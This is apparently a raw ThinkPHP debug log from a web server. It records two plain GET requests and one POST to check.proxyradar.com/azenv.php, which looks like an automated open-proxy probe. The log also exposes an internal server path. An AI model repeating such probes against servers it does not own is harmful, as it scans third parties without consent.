[运行时间：0.023328s] [吞吐率：42.87req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T21:39:49+08:00] 152.254.243.97 GET 39.96.87.22:80/
[运行时间：0.021721s] [吞吐率：46.04req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T23:22:37+08:00] 95.213.177.126 POST check.proxyradar.com/azenv.php?auth=155681055775&a=PSCN&i=660625174&p=80
[运行时间：0.014915s] [吞吐率：67.05req/s] [内存消耗：1,724.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
